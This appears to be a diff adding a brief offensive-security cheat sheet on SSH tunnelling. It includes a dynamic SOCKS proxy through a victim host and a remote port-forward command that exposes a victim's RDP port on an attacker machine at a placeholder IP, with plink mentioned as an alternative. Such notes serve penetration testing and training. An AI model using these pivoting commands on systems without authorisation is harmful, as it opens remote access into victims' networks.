@@ -1,0 +1,15 @@
+#tunnelling tunnel ssh dns plink forwarding
+
+#SSH Tunnelling
+
+#SSH Dynamic Port Forwarding (opens a port on localhost 8088 that listens and connects anything using it as a proxy through the host at X.X.X.X)
+#This is ATTACKER (open local port) -> SSH -> VICTIM
+ssh -D 8088 root@X.X.X.X
+
+#SSH Remote Port Forwarding:
+#This is VICTIM (Forwards local port to port on attacker machine -> SSH -> ATTACKER IP:
+ssh <gateway(attacker IP)> -R <remote port to bind>:<local host>:<local port>
+#Example RDP Exposure (Attacker:X.X.X.X)
+(From Victim - could use plink.exe as well)
+ssh X.X.X.X -R 3390:127.0.0.1:3389
+#The above will expose port 3390 on the attacker machine as the RDP port for the Victim)
